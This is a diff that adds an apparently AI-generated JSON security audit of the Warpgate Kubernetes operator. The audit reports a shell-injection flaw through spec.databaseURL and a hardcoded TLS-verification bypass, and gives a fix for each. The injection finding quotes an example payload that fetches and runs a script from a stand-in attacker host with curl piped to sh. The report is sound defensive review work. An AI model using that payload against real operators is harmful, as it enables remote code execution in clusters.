@@ -1,0 +1,37 @@
+{
+  "summary": "Reviewed the Warpgate Kubernetes operator's WarpgateInstance controller, its CRD types, validating webhook, and the warpgate HTTP client. Both findings were confirmed against the code and kept. Finding 1 (command injection via spec.databaseURL) is a genuine CWE-78: the field is a free-form string with no CRD pattern and only a non-blocking webhook warning, and it is interpolated unsanitized into a /bin/sh -c init script. Finding 2 (hardcoded InsecureSkipVerify while sending admin credentials) is a genuine CWE-295, though its exploitation requires an in-cluster MITM precondition, so it stays low severity.",
+  "coverage": [
+    "internal/controller/warpgateinstance_controller.go",
+    "api/v1alpha1/warpgateinstance_types.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "internal/warpgate/client.go"
+  ],
+  "findings": [
+    {
+      "title": "Shell command injection via WarpgateInstance.spec.databaseURL in init-container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "medium",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment assembles a /bin/sh init script by string concatenation and runs it with `Command: [\"/bin/sh\", \"-c\", initScript]` (line 776). The user-controlled field spec.databaseURL is interpolated directly into the setup command inside double quotes: `--database-url \"<databaseURL>\"` (line 557). The validating webhook (validateWarpgateInstance) never checks databaseURL beyond emitting a warning (webhook lines 256-258), and the CRD type (DatabaseURL string, types.go:86) has no pattern/validation. A databaseURL such as `x\";curl http://attacker/x|sh;\"` breaks out of the quotes and executes arbitrary commands in the warpgate init container before the main process starts. This is reachable by anyone who can create/update a WarpgateInstance CR. In clusters that constrain the image via admission policy (e.g. an image allowlist) this bypasses that control to achieve code execution with an approved image. The same unsanitized value is also written into the generated warpgate.yaml ConfigMap inside quotes (buildWarpgateConfig, line 345) enabling YAML injection; spec.externalHost is likewise written unquoted at line 380. Both secondary sinks were confirmed.",
+      "evidence": "api/v1alpha1/warpgateinstance_types.go:86 `DatabaseURL string` (no validation markers, only +optional). Webhook: api/v1alpha1/warpgateinstance_webhook.go:256-258 only appends a warning (\"databaseURL is set \u2014 SQLite persistence via PVC is not needed\"). Sink: warpgateinstance_controller.go:556 `if inst.Spec.DatabaseURL != \"\" {` / :557 `setupCmd += fmt.Sprintf(\" --database-url \\\"%s\\\"\", inst.Spec.DatabaseURL)`. Appended at :570 (`fmt.Sprintf(\"  %s\", setupCmd)`), joined at :611, executed at :776 `Command: []string{\"/bin/sh\", \"-c\", initScript}`. Secondary YAML sinks confirmed at :345 and :380.",
+      "recommendation": "Do not build shell commands via string interpolation of CR fields. Pass databaseURL to the init container through an environment variable (as is already done for ADMIN_PASSWORD) and reference it as a quoted shell variable, or validate databaseURL strictly against an allowed connection-string grammar in the webhook. Apply the same treatment to externalHost and any other spec strings written into the config file."
+    },
+    {
+      "title": "Auto-created WarpgateConnection hardcodes InsecureSkipVerify=true while transmitting admin credentials",
+      "category": "security",
+      "cwe": "CWE-295",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 1109,
+      "line_end": 1113,
+      "description": "ensureWarpgateConnection creates a WarpgateConnection whose InsecureSkipVerify is hardcoded to true, and an auth Secret containing the Warpgate admin username/password copied from the admin password Secret (lines 1080-1088). The warpgate client (NewClient) honors InsecureSkipVerify by building a tls.Config{InsecureSkipVerify:true}, so the operator authenticates to the instance over HTTPS with certificate verification disabled, performing a username/password login. An attacker able to intercept in-cluster traffic to the <name>-http service (e.g. a malicious pod performing ARP/DNS spoofing, or a compromised CNI path) can present any certificate, man-in-the-middle the session, and capture the Warpgate admin credentials. Verification is unconditionally off \u2014 even when cert-manager is enabled and a trusted CA exists \u2014 so there is no way to opt into validating/pinning the certificate. Exploitation requires a prior in-cluster MITM position, which keeps the practical severity low.",
+      "evidence": "warpgateinstance_controller.go:1109-1113 `conn.Spec = warpgatev1alpha1.WarpgateConnectionSpec{ Host: host, AuthSecretRef: ...{Name: authSecretName}, InsecureSkipVerify: true, // self-signed cert within cluster }`. Admin password copied at warpgateinstance_controller.go:1080-1088 into Secret keys username/password. internal/warpgate/client.go:55-59 turns InsecureSkipVerify into `tls.Config{InsecureSkipVerify: true}` (// #nosec G402). Login path uses username/password when no token is set (client.go:71-77).",
+      "recommendation": "Provision the instance TLS via cert-manager (or a CA the operator trusts) and validate the server certificate, or pin/trust the generated certificate's CA in the client transport (RootCAs) instead of disabling verification. Prefer token-based auth over sending the admin password, and avoid hardcoding InsecureSkipVerify so operators can require verification."
+    }
+  ]
+}
